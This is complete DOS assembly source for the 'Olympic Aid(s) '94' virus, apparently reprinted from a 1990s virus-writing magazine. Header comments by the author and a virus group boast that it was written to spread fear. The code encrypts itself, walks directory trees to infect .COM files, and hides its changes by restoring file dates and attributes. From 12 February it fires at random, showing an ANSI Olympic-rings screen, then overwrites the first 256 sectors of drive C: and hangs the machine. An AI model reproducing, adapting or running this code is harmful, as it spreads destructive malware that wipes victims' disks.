 ; VirusName: Olympic Aid(s) '94
 ; Origin   : Norway
 ; Author   : The Penetrator
 ; Date     : 1/01/1994
 ;
 ; Hopefully the Olympics at Lillehammer is over when you read this
 ; shit.This virus was made only for creating fear, and some publicity.
 ; 
 ; Anyway this is a new selfencrypting non-overwriting *.COM infector...
 ; And YES, it may (and WILL) harm you. It's a 10% chanse for a Major
 ; ScrewUp (NO ScrewUps before February the 12th. Just to give it some
 ; time to spread)
 ;
 ; And I have to send some fuckings to Norman Data Defence Systems in 
 ; Drammen, Norway. They is fucking up the BBS scene here in Norway 
 ; right now!
 ;			// The Penetrator/NORWAY
 ; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
 ; (Now follows Immortal Riot comments!);
 ; This is the virus, WE got accused for writing, how silly! Anyhow
 ; I picked this one up from a dude in Norway, and he told me that
 ; I could include it in our magazine, or whatever.
 ;
 ; It's nothing fancy or something, but hey! it surely was easy
 ; publicity!, too bad that the papers accused US for doing it..
 ; We didn't, this is just a contribution from our friends in Norway,
 ; that we picked up AFTER we'd got the silly F-bull 2.11, and had to
 ; investigate the situation.
 ;  
 ; I've in this version recieved another ansi-screen to include, dunno
 ; about the last one.. Anyhow, this is as The Penetrate said a non-ow   
 ; .COM infector. It searches the whole directory tree of files to
 ; infect, thus making it slow when its spreads trough the drive. It's
 ; also highly destructive (NM.NUKE.VCL.256.TRASH). Some code resembles
 ; of VCL based code, but if you want to read more about it, just read
 ; our article about VCL.Olympic also included in Insane Reality issue4. 
 ;
 ; HAHA!, Norway, Sweden got 24 gold-medals from the Olympic.Games
 ; (If the ice-hockey counts!!), just as I told you! Haha!, AND give
 ; my best to Beate (can't you give girls REAL-names in Norway??).
 ;
 ; Thanks to All Norweigian contributors // The Unforgiven/Immortal Riot.
 ;
 ; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
 ;                           OLYMPIC AID(S) '94
 ; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

code            segment byte public
		assume  cs:code,ds:code,es:code,ss:code
		org     0100h


 ; ÄÄ-ÄÄÄÄÄÄ-ÄÄ JUST FOR FIRST TIME INSTALLING --Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

main            proc    near
		db      0E9h,00h,00h            ; Near Jump

 ; ÄÄ-ÄÄÄÄÄÄ-ÄÄ S T A R T   O F   V I R I I ÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

start:          call    find_offset             ; Like a PUSH IP
find_offset:    pop     bp                      ; We love POP'ing
                push    bp                      ; and PUSH'ing
      	        pop     bp                      ; bp's
		sub     bp,offset find_offset   ; Adjust for length of host

GeneticChange:  MOV     byte ptr [BP+GeneticChange+4],001h ;

		call    encrypt_decrypt         ; Decrypt the virus

start_of_code   label   near

		lea     si,[bp + buffer]        ; SI points to original start
		mov     di,0100h                ; Push 0100h on to stack for
		push    di                      ; return to main program
		movsw                           ; Copy the first two bytes
		movsb                           ; Copy the third byte

		mov     di,bp                   ; DI points to start of virus

		mov     bp,sp                   ; BP points to stack
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer on stack
		int     021h


		mov     cx,0005h                ; Do X infections
search_loop:    push    cx                      ; Save CX
		add     byte ptr [DI+GeneticChange+4],001h ; Some BullShit!!!
		call    search_files            ; Find and infect a file
		pop     cx                      ; Restore CX
		loop    search_loop             ; Repeat until CX is 0


 ; ÄÄ-ÄÄÄÄÄÄ-ÄÄ CHECKING DATE/TIME FOR OLYMPIC START ÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

CheckDate:      mov     ah,2ah
		int     21h                     ; DOS Services  ah=function 2Ah
						; get date, cx=year, dh=month
						; dl=day, al=day-of-week 0=SUN
	
		cmp     DH,2h                   ; February
		jB      NoFuckUp
		cmp     DL,12                   ; The Olympics is starting
		jB      NoFuckUp                ; the 12 th.

		mov     ah,2Ch
		int     21h                     ; DOS Services  ah=function 2Ch
						; get time, cx=hrs/min, dx=sec
		cmp     DL,10                   ; 10 % chanse for...
		jA      NoFuckUp

Yeah:           jmp     OL1994                  ; ScrewUp...
	

 ; ÄÄ-ÄÄÄÄÄÄ-ÄÄ RETURN NICELY AND QUIET TO INFECTED FILE ÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

NoFuckUp:       pop     dx                      ; DX holds original DTA address
		mov     ah,01Ah                 ; DOS set DTA function
		int     021h

		mov     sp,bp                   ; Deallocate local buffer

		xor     ax,ax                   ;
		mov     bx,ax                   ;
		mov     cx,ax                   ;
		mov     dx,ax                   ; Empty out the registers
		mov     si,ax                   ;
		mov     di,ax                   ;
		mov     bp,ax                   ;

		ret                             ; Return to original program
main            endp


; ÄÄ-ÄÄÄÄÄÄ-ÄÄ LET'S LOOK AT THE OLYMPIC RINGS -Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

OL1994:         mov     ah,0Fh                  ; BIOS get video mode function
		int     010h
		xor     ah,ah                   ; BIOS set video mode function
		int     010h                    ; (Clear Screen)

		lea     si,[di + AnsiData]      ; SI points to data
		mov     cx,AnsiEnd-AnsiData     ; Data Length

       JCXZ    Done

	xor di,di
	mov ax,0b800h
	mov es,ax

       MOV     DX,DI                   ;Save X coordinate for later.
       XOR     AX,AX                   ;Set Current attributes.
       CLD

LOOPA: LODSB                           ;Get next character.
       CMP     AL,32                   ;If a control character, jump.
       JC      ForeGround
       STOSW                           ;Save letter on screen.
Next:  LOOP    LOOPA
       JMP     Short Done

ForeGround:
       CMP     AL,16                   ;If less than 16, then change the
       JNC     BackGround              ;foreground color.  Otherwise jump.
       AND     AH,0F0H                 ;Strip off old foreground.
       OR      AH,AL
       JMP     Next

BackGround:
       CMP     AL,24                   ;If less than 24, then change the
       JZ      NextLine                ;background color.  If exactly 24,
       JNC     FlashBitToggle          ;then jump down to next line.
       SUB     AL,16                   ;Otherwise jump to multiple output
       ADD     AL,AL                   ;routines.
       ADD     AL,AL
       ADD     AL,AL
       ADD     AL,AL
       AND     AH,8FH                  ;Strip off old background.
       OR      AH,AL
       JMP     Next

NextLine:
       ADD     DX,160                  ;If equal to 24,
       MOV     DI,DX                   ;then jump down to
       JMP     Next                    ;the next line.

FlashBitToggle:
       CMP     AL,27                   ;Does user want to toggle the blink
       JC      MultiOutput             ;attribute?
       JNZ     Next
       XOR     AH,128                  ;Done.
       JMP     Next

MultiOutput:
       CMP     AL,25                   ;Set Z flag if multi-space output.
       MOV     BX,CX                   ;Save main counter.
       LODSB                           ;Get count of number of times
       MOV     CL,AL                   ;to display character.
       MOV     AL,32
       JZ      StartOutput             ;Jump here if displaying spaces.
       LODSB                           ;Otherwise get character to use.
       DEC     BX                      ;Adjust main counter.

StartOutput:
       XOR     CH,CH
       INC     CX
       REP STOSW
       MOV     CX,BX
       DEC     CX                      ;Adjust main counter.
       LOOPNZ  LOOPA                   ;Loop if anything else to do...
Done:
	

 ; ÄÄ-ÄÄÄÄÄÄ-ÄÄ HAAKON & KRISTIN SCREWS UP -----Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä


TrashHD:        CLI                             ; Disable interrupts
		mov     ax,0002h                ; DRIVE C:
		mov     cx,100h                 ; Sectors (100hex=256DEC!)
		XOR     DX,DX                   ; Clear DX (start with sector 0)
		int     026h                    ; DOS absolute write interrupt
EndlessLoop:    JMP     EndlessLoop             ; Boring...ehh???
	

 ; ÄÄ-ÄÄÄÄÄÄ-ÄÄ FIND FILES ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

search_files    proc    near
		push    bp                      ; Save BP
		mov     bp,sp                   ; BP points to local buffer
		sub     sp,64                   ; Allocate 64 bytes on stack

		mov     ah,047h                 ; DOS get current dir function
		xor     dl,dl                   ; DL holds drive # (current)
		lea     si,[bp - 64]            ; SI points to 64-byte buffer
		int     021h

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[di + root]          ; DX points to root directory
		int     021h

		call    traverse                ; Start the traversal

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 64]            ; DX points to old directory
		int     021h

		mov     sp,bp                   ; Restore old stack pointer
		pop     bp                      ; Restore BP
		ret                             ; Return to caller

root            db      "\",0                   ; Root directory
search_files    endp

traverse        proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first function
		mov     cx,00010000b            ; CX holds search attributes
		lea     dx,[di + all_files]     ; DX points to "*.*"
		int     021h
		jc      leave_traverse          ; Leave if no files present

check_dir:      cmp     byte ptr [bp - 107],16  ; Is the file a directory?
		jne     another_dir             ; If not, try again
		cmp     byte ptr [bp - 98],'.'  ; Did we get a "." or ".."?
		je      another_dir             ;If so, keep going

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 98]            ; DX points to new directory
		int     021h

		call    traverse                ; Recursively call ourself

		pushf                           ; Save the flags
		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[di + up_dir]        ; DX points to parent directory
		int     021h
		popf                            ; Restore the flags

		jnc     done_searching          ; If we infected then exit

another_dir:    mov     ah,04Fh                 ; DOS find next function
		int     021h
		jnc     check_dir               ; If found check the file

leave_traverse:
		lea     dx,[di + com_mask]      ; DX points to "*.COM"
		call    find_files              ; Try to infect a file
done_searching: mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller

up_dir          db      "..",0                  ; Parent directory name
all_files       db      "*.*",0                 ; Directories to search for
com_mask        db      "*.COM",0               ; Mask for all .COM files
traverse        endp


 ; ÄÄ-ÄÄÄÄÄÄ-ÄÄ FIND MORE FILES ÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

find_files      proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		push    dx                      ; Save file mask
		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first file function
		mov     cx,00100111b            ; CX holds all file attributes
		pop     dx                      ; Restore file mask
find_a_file:    int     021h
		jc      done_finding            ; Exit if no files found
		call    infect_file             ; Infect the file!
		jnc     done_finding            ; Exit if no error
		mov     ah,04Fh                 ; DOS find next file function
		jmp     short find_a_file       ; Try finding another file

done_finding:   mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller
find_files      endp


 ; ÄÄ-ÄÄÄÄÄÄ-ÄÄ FUCK A FILE ÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

infect_file     proc    near
		mov     ah,02Fh                 ; DOS get DTA address function
		int     021h
		mov     si,bx                   ; SI points to the DTA

		mov     byte ptr [di + set_carry],0  ; Assume we'll fail

		cmp     word ptr [si + 01Ah],(65279 - (finish - start))
		jbe     size_ok                 ; If it's small enough continue
		jmp     infection_done          ; Otherwise exit

size_ok:        mov     ax,03D00h               ; DOS open file function, r/o
		lea     dx,[si + 01Eh]          ; DX points to file name
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,03Fh                 ; DOS read from file function
		mov     cx,3                    ; CX holds bytes to read (3)
		lea     dx,[di + buffer]        ; DX points to buffer
		int     021h

		mov     ax,04202h               ; DOS file seek function, EOF
		cwd                             ; Zero DX _ Zero bytes from end
		mov     cx,dx                   ; Zero CX /
		int     021h

		xchg    dx,ax                   ; Faster than a PUSH AX
		mov     ah,03Eh                 ; DOS close file function
		int     021h
		xchg    dx,ax                   ; Faster than a POP AX

		sub     ax,finish - start + 3   ; Adjust AX for a valid jump
		cmp     word ptr [di + buffer + 1],ax  ; Is there a JMP yet?
		je      infection_done          ; If equal then exit
		mov     byte ptr [di + set_carry],1  ; Success -- the file is OK
		add     ax,finish - start       ; Re-adjust to make the jump
		mov     word ptr [di + new_jump + 1],ax  ; Construct jump

		mov     ax,04301h               ; DOS set file attrib. function
		xor     cx,cx                   ; Clear all attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

		mov     ax,03D02h               ; DOS open file function, r/w
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,040h                 ; DOS write to file function
		mov     cx,3                    ; CX holds bytes to write (3)
		lea     dx,[di + new_jump]      ; DX points to the jump we made
		int     021h

		mov     ax,04202h               ; DOS file seek function, EOF
		cwd                             ; Zero DX _ Zero bytes from end
		mov     cx,dx                   ; Zero CX /
		int     021h

		push    si                      ; Save SI through call
		call    encrypt_code            ; Write an encrypted copy
		pop     si                      ; Restore SI

		mov     ax,05701h               ; DOS set file time function
		mov     cx,[si + 016h]          ; CX holds old file time
		mov     dx,[si + 018h]          ; DX holds old file date
		int     021h

		mov     ah,03Eh                 ; DOS close file function
		int     021h

		mov     ax,04301h               ; DOS set file attrib. function
		xor     ch,ch                   ; Clear CH for file attribute
		mov     cl,[si + 015h]          ; CX holds file's old attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

infection_done: cmp     byte ptr [di + set_carry],1  ; Set carry flag if failed
		ret                             ; Return to caller

set_carry       db      ?                       ; Set-carry-on-exit flag
buffer          db      090h,0CDh,020h          ; Buffer to hold old three bytes
new_jump        db      0E9h,?,?                ; New jump to virus
infect_file     endp


 ; ÄÄ-ÄÄÄÄÄÄ-ÄÄ CRUNCHED OLYMPIC RINGS -ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

AnsiData:       DB      15,16,24,24,24,1,26,17,'Ä  ',15,'L  i  l  l  e  h  a'
		DB      '  m  m  e  r  ',39,'  9  4  ',1,26,17,'Ä',24,24,25,20
		DB      'Haakon And Kristin Blew It Up Again...',24,25,19,26,5
		DB      'Ü',25,10,8,26,5,'Ü',25,10,4,26,5,'Ü',24,25,16,1,'ÜÛ'
		DB      'ßß',25,3,'ßßÛÜ',25,4,8,'ÜÛßß',25,3,'ßßÛÜ',25,4,4,'Ü'
		DB      'Ûßß',25,3,'ßßÛÜ',24,25,15,1,'Ûß',25,8,14,'Ü',17,'Ü',1
		DB      16,'Û',14,'ÜÜÜ',8,'Ûß',25,8,2,'Ü',8,18,'ß',16,'Û',2,'Ü'
		DB      'ÜÜ',4,'Ûß',25,9,'ßÛ',24,25,14,1,'Ûß',25,6,14,'ÜÛßß '
		DB      1,'ßÛ ',8,'Ûß',14,'ÛÜ',25,4,2,'ÜÛßß ',8,'ßÛ ',20,' ',0
		DB      'Ü',2,16,'ÛÜ',25,9,4,'ßÛ',24,25,14,1,'ÛÜ',25,5,14,'Û'
		DB      'ß',25,3,1,'ÜÛ ',8,'ÛÜ ',14,'ßÛ',25,2,2,'Ûß',25,3,8,'Ü'
		DB      'Û ',4,'ÛÜ ',2,'ßÛ',25,8,4,'ÜÛ',24,25,15,1,'ÛÜ',25,3,14
		DB      'Ûß',25,3,1,'ÜÛ',25,2,8,'ÛÜ ',14,'ßÛ ',2,'Ûß',25,3,8,'Ü'
		DB      'Û',25,2,4,'ÛÜ ',2,'ßÛ',25,6,4,'ÜÛ',24,25,16,1,'ßÛÜÜ'
		DB      ' ',14,'ÛÜ ',1,'ÜÜÛß',25,4,8,'ßÛ',14,'ÜÛ ',2,'ÛÜ ',8,'Ü'
		DB      'ÜÛß',25,4,4,'ßÛ',2,'ÜÛ',25,3,4,'ÜÜÛß',24,25,19,1,'ß'
		DB      'ßß',14,17,'ÛÜ',1,16,'ß',25,8,14,'ÜÛ',8,'ßßß',2,'Û',8
		DB      18,'ß',16,'ß',25,8,2,'ÜÛ',4,26,5,'ß',24,25,23,14,'ßÛ'
		DB      'ÜÜ',25,3,'ÜÜÛß',25,4,2,'ßÛÜÜ',25,3,'ÜÜÛ',0,18,'Ü',24
		DB      16,25,26,14,26,5,'ß',25,10,2,26,5,'ß',25,12,0,'1',24,1
		DB      'This Time They Have Been Fucking Around With The Ol'
		DB      'ympic Computers, And Managed',24,25,2,'To Infect A '
		DB      'Lot Of Your Computers With A Little Tiny Destructiv'
		DB      'e Virus...',24,24,'Now, Antonio, You Can',39,'t Let'
		DB      ' Them Runaway With This, Punish The Little Bastards'
		DB      '!',24,24,26,'OÄ',24,24,24,24
AnsiEnd:        DB      0


 ; ÄÄ-ÄÄÄÄÄÄ-ÄÄ WRITE ENCRYPTED COPY Ä--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

encrypt_code    proc    near
		push    bp                      ; Save BP
		mov     bp,di                   ; Use BP as pointer to code
		lea     si,[bp + encrypt_decrypt]; SI points to cipher routine

		xor     ah,ah                   ; BIOS get time function
		int     01Ah
		mov     word ptr [si + 9],dx    ; Low word of timer is new key

		xor     byte ptr [si + 1],8     ;
		xor     byte ptr [si + 8],1     ; Change all SIs to DIs
		xor     word ptr [si + 11],0101h; (and vice-versa)

		lea     di,[bp + finish]        ; Copy routine into heap
		mov     cx,finish - encrypt_decrypt - 1  ; All but final RET
		push    si                      ; Save SI for later
		push    cx                      ; Save CX for later
	rep     movsb                           ; Copy the bytes

		lea     si,[bp + write_stuff]   ; SI points to write stuff
		mov     cx,5                    ; CX holds length of write
	rep     movsb                           ; Copy the bytes

		pop     cx                      ; Restore CX
		pop     si                      ; Restore SI
		inc     cx                      ; Copy the RET also this time
	rep     movsb                           ; Copy the routine again

		mov     ah,040h                 ; DOS write to file function
		lea     dx,[bp + start]         ; DX points to virus

		lea     si,[bp + finish]        ; SI points to routine
		call    si                      ; Encrypt/write/decrypt

		mov     di,bp                   ; DI points to virus again
		pop     bp                      ; Restore BP
		ret                             ; Return to caller

write_stuff:    mov     cx,finish - start       ; Length of code
		int     021h
encrypt_code    endp

end_of_code     label   near

 ; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

 Note            db      " Olympic Aid(s) '94 "
		 db      " (c) The Penetrator "

 ; ÄÄ-ÄÄÄÄÄÄ-ÄÄ ENCRYPT/DECRYPT ÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

encrypt_decrypt proc    near
		lea     si,[bp + start_of_code] ; SI points to code to decrypt
		mov     cx,(end_of_code - start_of_code) / 2 ; CX holds length
xor_loop:       db      081h,034h,00h,00h       ; XOR a word by the key
		inc     si                      ; Do the next word
		inc     si                      ;
		loop    xor_loop                ; Loop until we're through
		ret                             ; Return to caller
encrypt_decrypt endp
finish          label   near

code            ends
		end     main


 ; ÄÄ-ÄÄÄÄÄÄ-ÄÄ END OF STORY ÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä